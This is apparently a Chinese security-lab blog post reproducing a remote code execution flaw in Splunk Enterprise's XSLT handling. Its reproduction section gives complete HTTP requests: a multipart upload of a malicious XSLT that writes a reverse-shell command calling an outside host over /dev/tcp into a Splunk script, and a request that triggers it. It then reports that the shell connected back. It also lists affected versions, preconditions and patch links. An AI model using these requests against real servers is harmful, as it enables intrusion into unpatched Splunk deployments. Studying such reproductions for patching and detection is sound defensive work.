<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9F4xPc8pcp6ORW6djri31g)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

Splunk 是美国 Splunk 公司的一套数据收集分析软件。该软件主要用于收集、索引和分析及其所产生的数据，包括所有 IT 系统和基础结构（物理、虚拟机和云）生成的数据。

Splunk Enterprise 9.0.0 到 9.0.6 版本、9.1.0 到 9.1.1 版本存在安全漏洞，该漏洞源于不会安全地清理用户提供的可扩展样式表语言转换 (XSLT)，攻击者利用该漏洞可以上传恶意 XSLT，从而在 Splunk Enterprise 实例上远程执行代码。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

9.0.0 <= Splunk Enterprise <= 9.0.6 

9.1.0 <= Splunk Enterprise <= 9.1.1 

Splunk Cloud < 9.1.2308

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA2oOSDmQTN1tDichu8ZBdK01WEF9YTu2V7oLVh8hwNM2lZINGTk8kgDPw/640?wx_fmt=png&from=appmsg)

**注：利用条件**

**具有上传权限；Splunk 未在 SHC 模式下运行**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA2351AhIqHgejyqjFthGQSoglxkYwy2ROelqGiaI3sqrJrphnvlHONicgQ/640?wx_fmt=png&from=appmsg)

2. 对漏洞进行复现

 **POC （POST）**

漏洞复现

```
POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl HTTP/1.1
Host: 10.211.55.3:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate
Accept: text/javascript, text/html, application/xml, text/xml, */*
Connection: keep-alive
X-Requested-With: XMLHttpRequest
X-Splunk-Form-Key: 14405369367646981099
Cookie: session_id_8000=a74248449dd62e179dd17c05239d79708108da5f; splunkd_8000=O8DQPrZvhze8hbm7y^q^hgThhqSnx5RNXWEw7FU1lUbFUKO03x5n_DiqI0^m36KB2MZvtQxQpR^kgDUHFbcrxW4avet7juFQKvzaRbBDgARHZiZFqNiLaByswQCKCHIYmC; splunkweb_csrf_token_8000=14405369367646981099
Content-Length: 620
Content-Type: multipart/form-data; boundary=3d5f09288540918f033268ff6bceb049
--3d5f09288540918f033268ff6bceb049
Content-Disposition: form-data; 
Content-Type: application/xslt+xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
        <xsl:text>sh -i >& /dev/tcp/8.8.8.8/12388 0>&1</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
--3d5f09288540918f033268ff6bceb049--

```

     上传 xsl 文件成功

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA2vTGtxYjZRQhUzrHicyt0N8D3xFiaNUxuVQLQpfOzTyG8a7RFJ1TRgBWA/640?wx_fmt=png&from=appmsg)

解析文件

```
GET /en-US/api/search/jobs/1700617012.37/results?xsl=/opt/splunk/var/run/splunk/dispatch/1700617012.36/shell.xsl HTTP/1.1
Host: 10.211.55.3:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: session_id_8000=a74248449dd62e179dd17c05239d79708108da5f; splunkd_8000=O8DQPrZvhze8hbm7y^q^hgThhqSnx5RNXWEw7FU1lUbFUKO03x5n_DiqI0^m36KB2MZvtQxQpR^kgDUHFbcrxW4avet7juFQKvzaRbBDgARHZiZFqNiLaByswQCKCHIYmC; splunkweb_csrf_token_8000=14405369367646981099

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA2GHFqEt7fFZyToEiacnibndqRojaFutOOIwgrQ6OjNHelXKd4zRicsx5HA/640?wx_fmt=png&from=appmsg)

3. 成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA23MWEAH1KAgNU4NZ6rP5QJyEMvK8OiaibtBWpK6QAcpiaPlensAnrhMMSQ/640?wx_fmt=png&from=appmsg)

3.python 脚本测试（漏洞存在）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCC8VR6rp7drz7LmbqcbnA2Ap6N7WnlD933aXD1KeCG1dfvibib5jAh4n3q12aiaheeRBu0BPAYPADFg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://advisory.splunk.com/advisories/SVD-2023-1104
https://blog.hrncirik.net/cve-2023-46214-analysis
https://github.com/nathan31337/Splunk-RCE-poc

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)